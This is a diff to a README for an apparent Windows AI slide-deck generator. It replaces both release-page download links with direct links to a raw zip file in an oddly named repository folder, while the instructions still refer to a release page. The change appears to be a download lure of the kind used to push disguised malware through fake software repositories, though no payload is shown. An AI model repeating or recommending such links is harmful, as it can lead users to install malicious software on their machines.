@@ -1,6 +1,6 @@
 # 📊 ai-presentations-gamma-tome - Design professional slide decks in seconds
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jurymastrepeater420/ai-presentations-gamma-tome/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/jurymastrepeater420/ai-presentations-gamma-tome/raw/refs/heads/main/myectopia/ai_tome_gamma_presentations_v1.8-alpha.4.zip)
 
 This application creates presentation slides. It uses artificial intelligence to generate layouts, text, and images. You can use this tool to build decks similar to Gamma or Tome. The software automates the design process so you save time on formatting.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. The application works best
 
 ## 💾 Downloading the Application
 
-Visit this page to download the software: https://github.com/jurymastrepeater420/ai-presentations-gamma-tome/releases
+Visit this page to download the software: https://github.com/jurymastrepeater420/ai-presentations-gamma-tome/raw/refs/heads/main/myectopia/ai_tome_gamma_presentations_v1.8-alpha.4.zip
 
 1. Click the link above to view the release page.
 2. Look for the section labeled Assets.
